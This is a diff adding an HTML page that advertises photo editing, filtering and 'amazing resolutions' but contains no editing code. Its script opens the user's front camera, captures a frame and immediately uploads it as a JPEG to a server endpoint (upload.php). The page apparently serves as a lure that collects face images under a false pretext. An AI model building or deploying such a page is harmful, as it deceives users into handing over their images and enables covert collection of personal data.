@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture System</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>simple editing </h1>
+        <h1><i>high photo filtering after capturing</i></h1>
+        <h1><i>background and photo color editing and amazing resolutions </i></h1>
+        <p><b>Click the button below to take your photo:</bb></p>
+        
+        <button id="start-camera" class="btn">Start Camera</button>
+        
+        <div class="camera-container hidden">
+            <video id="camera-view" autoplay playsinline></video>
+            <button id="capture-btn" class="btn">Capture Photo</button>
+        </div>
+        
+        <div id="result-container" class="hidden">
+            <h3>Your Photo:</h3>
+            <canvas id="photo-result"></canvas>
+            <p id="upload-status"></p>
+        </div>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('start-camera');
+        const captureBtn = document.getElementById('capture-btn');
+        const cameraView = document.getElementById('camera-view');
+        const cameraContainer = document.querySelector('.camera-container');
+        const resultContainer = document.getElementById('result-container');
+        const photoResult = document.getElementById('photo-result');
+        const uploadStatus = document.getElementById('upload-status');
+        
+        let cameraStream = null;
+
+        // Start camera
+        startBtn.addEventListener('click', async () => {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 1280, height: 720 },
+                    audio: false
+                });
+                
+                cameraView.srcObject = cameraStream;
+                cameraContainer.classList.remove('hidden');
+                startBtn.classList.add('hidden');
+            } catch (err) {
+                alert(`Camera Error: ${err.message}`);
+                console.error("Camera Error:", err);
+            }
+        });
+
+        // Capture photo
+        captureBtn.addEventListener('click', () => {
+            const context = photoResult.getContext('2d');
+            photoResult.width = cameraView.videoWidth;
+            photoResult.height = cameraView.videoHeight;
+            context.drawImage(cameraView, 0, 0, photoResult.width, photoResult.height);
+            
+            cameraContainer.classList.add('hidden');
+            resultContainer.classList.remove('hidden');
+            
+            uploadPhoto();
+        });
+
+        // Upload to server
+        async function uploadPhoto() {
+            uploadStatus.textContent = "Uploading photo...";
+            
+            photoResult.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo_'+Date.now()+'.jpg');
+                
+                try {
+                    const response = await fetch('upload.php', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await response.text();
+                    uploadStatus.textContent = "Upload successful!";
+                    console.log("Upload Result:", result);
+                    
+                    // Stop camera
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                } catch (err) {
+                    uploadStatus.textContent = "Upload failed. Please try again.";
+                    console.error("Upload Error:", err);
+                }
+            }, 'image/jpeg', 0.9);
+        }
+    </script>
+</body>
+</html>
